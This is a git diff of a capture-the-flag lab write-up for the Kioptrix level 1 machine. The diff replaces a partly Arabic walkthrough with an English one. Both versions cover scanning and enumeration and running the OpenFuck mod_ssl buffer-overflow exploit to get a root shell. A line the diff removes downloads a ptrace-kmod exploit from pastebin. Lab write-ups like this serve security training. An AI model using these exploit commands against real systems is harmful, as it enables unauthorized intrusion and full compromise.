@@ -1,60 +1,103 @@
-Markdown
-# Lvl1 - Apache 1.3.20 mod_ssl Remote Exploit (OpenFuck)
 
-**Target:** 192.168.91.157
-**Vulnerability:** CVE-2002-0082 / CVE-2002-0083 - Apache mod_ssl Buffer Overflow
-**Exploit:** OpenFuck.c (OpenFuckV2.c)
+target machein level 1 
 
-### 1. Discovery & Enumeration
-```bash
-sudo arp-scan -l
-nmap -sV -Pn -n 192.168.91.157
-nikto -h http://192.168.91.157
 
-6 lines hidden
-Nmap result showed:
-Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+scanning with nmap
+nmap -Pn -n -sS -sV  <ip target>
+ 
+ i found some ports open
+ 22/tcp    open  ssh   
+ 80/tcp    open  http
+ 111/tcp   open  rpcbind
+ 139/tcp   open  netbios-ssn
+ 443/tcp   open  ssl/https
+ -------------------------------
+ 
+ ***enumeration 
+ 
+ 1- ssh 22
+ nmap -Pn -n -sV -p22 -sC -sS <ip target>
+ I found 
+ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
 
-ده version قديم جدا ومعروف انه مصاب بثغرة خطيرة في mod_ssl.
 
-2. Vulnerability Analysis
-Bash
-searchsploit Apache 1.3.20
-searchsploit mod_ssl 2.8.4
-لقيت 3 نتائج مهمة:
+2-http 80
+- whatweb http://<ip target>
+http://<ip target> [200 OK] Apache[1.3.20][mod_ssl/2.8.4], Country[RESERVED][ZZ], Email[webmaster@example.com], HTTPServer[Red Hat Linux][Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b], IP[ip target], OpenSSL[0.9.6b], Title[Test Page for the Apache Web Server on Red Hat Linux]
 
-unix/remote/21671.c -> OpenFuck.c
-unix/remote/764.c -> OpenFuckV2.c
-الثغرة دي بتسمح بـ Remote Code Execution عن طريق buffer overflow في mod_ssl.
+-nikto -h http://<ip target>  to find vuln / important dir
+ !!http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
 
-3. Exploitation
-نزلت الاكسبلوت وجمعته:
+-gobuster dir -u http://<ip target> -w /usr/share/wordlists/drib/common.txt -t 10       to find hidden dir
 
-Bash
-gcc -o OpenFuck 764.c -lcrypto
-# او من github: https://github.com/heltonWernik/OpenFuck
-الاستخدام:
-./OpenFuck <target> <box> <ip> <port> -c <connections>
+-manual notes
+  ______________________
 
-الـ Box هو نوع النظام، وهنا بنستخدم 0x6b لانه Red-Hat Linux:
+3- rpcbind 111
+ nmap -Pn -n -sT -p111 <ip target> -A
+ rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1          32768/tcp   status
+|_  100024  1          32768/udp   status
 
-Bash
-./OpenFuck 0x6b 192.168.91.157 443 -c 45
-بعد 45 محاولة:
+ 
+ showmount -e 192.168.240.131   
+ clnt_create: RPC: Program not registered
+  ___________________________
+ 
+4- netbios-ssn 139
+ nmap -Pn -n -sT -p139 <ip target> -A
+ Host script results:
+ |_smb2-time: Protocol negotiation failed (SMB2)
+ |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 
-Code
-Spawning shell...
-bash: no job control in this shell
-bash-2.05$
-قدرنا ندخل كـ apache وبعدها uid=0 لو الاكسبلوت اشتغل كـ root.
+ rpcclient -U "" -N <ip target>
+ >enumdomusers   to find users but it not find users
 
-حاولت اعمل privesc بـ ptrace-kmod:
+ I try with enum4linux but also it not find users
 
-Bash
-wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c
-بس فشل عشان الماشين مفيهاش انترنت والـ gcc قديم (2.96).
+ smbclient -L //<ip target> -N
+ Anonymous login successful
 
-4. Mitigation
-تحديث Apache لاخر version
-تحديث OpenSSL
-ايقاف mod_ssl القديم
+ i found sharename 
+ ADMIN$ 
+ IPC$   
+_____________________________________ 
+
+  Exploitation
+    
+ searchsploit Apache 1.3.20 
+ searchsploit mod_ssl 2.8.4
+ searchsploit OpenSSL 0.9.6b
+  I found "OpenFuck.c" Vulnerability (Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow (1) )       
+
+ After install the vuln 
+ {./OpenFuck <target> <box> <ip> <port> -c <connections> }
+ 
+ ./OpenFuck 0x6b 192.168.240.131 -c 43          (0x6b = Red-Hat Linux)
+ I got shell 
+ 
+ Connection... 43 of 43
+ Establishing SSL connection
+ cipher: 0x4043808c   ciphers: 0x80f8050
+ Ready to send shellcode
+ Spawning shell...
+ bash: no job control in this shell
+ bash-2.05$ whoami
+ root <Not need to privilege>
+ id
+ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+ 
+ 
+
+ 
+
+
+
+
